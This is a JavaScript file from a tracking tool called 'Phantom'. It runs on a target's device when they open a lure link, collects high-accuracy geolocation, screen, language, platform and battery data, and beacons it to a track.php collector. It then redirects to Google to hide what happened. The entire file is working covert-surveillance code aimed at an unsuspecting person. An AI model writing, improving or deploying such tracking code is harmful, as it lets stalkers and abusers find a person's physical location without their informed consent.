/**
 * Phantom – track.js
 * Runs on the target device when they open the tracking link.
 * Collects precise location, screen, battery → sends to track.php → redirects.
 */

(function () {
    // These two variables will be injected by track.php
    // window.PHANTOM_ID and window.PHANTOM_REDIRECT

    const trackId = window.PHANTOM_ID || '';
    const redirectUrl = window.PHANTOM_REDIRECT || 'https://www.google.com';

    if (!trackId) {
        location.replace(redirectUrl);
        return;
    }

    const endpoint = `track.php?id=${encodeURIComponent(trackId)}&js=1`;

    function sendData(data) {
        const payload = JSON.stringify(data);

        // Prefer sendBeacon (works even if page is closing)
        if (navigator.sendBeacon) {
            const blob = new Blob([payload], { type: 'application/json' });
            navigator.sendBeacon(endpoint, blob);
        } else {
            // Fallback
            fetch(endpoint, {
                method: 'POST',
                body: payload,
                headers: { 'Content-Type': 'application/json' },
                keepalive: true
            }).catch(() => {});
        }
    }

    function finish() {
        // Small delay so beacon has time to leave
        setTimeout(() => {
            location.replace(redirectUrl);
        }, 280);
    }

    // Collect basic info
    const basic = {
        screen: `${screen.width}x${screen.height}`,
        language: navigator.language || '',
        platform: navigator.platform || ''
    };

    // Try battery
    if (navigator.getBattery) {
        navigator.getBattery().then(battery => {
            basic.battery = {
                level: battery.level,
                charging: battery.charging
            };
        }).catch(() => {});
    }

    // Try precise geolocation
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            function (pos) {
                const precise = {
                    lat: pos.coords.latitude,
                    lon: pos.coords.longitude,
                    accuracy: pos.coords.accuracy,
                    altitude: pos.coords.altitude,
                    altitudeAccuracy: pos.coords.altitudeAccuracy,
                    heading: pos.coords.heading,
                    speed: pos.coords.speed
                };

                sendData({
                    ...basic,
                    precise: precise
                });

                finish();
            },
            function (err) {
                // User denied or error
                sendData({
                    ...basic,
                    precise: null,
                    geo_error: err.message || 'denied'
                });
                finish();
            },
            {
                enableHighAccuracy: true,
                timeout: 9000,
                maximumAge: 0
            }
        );
    } else {
        // No geolocation support
        sendData({
            ...basic,
            precise: null,
            geo_error: 'not_supported'
        });
        finish();
    }
})();
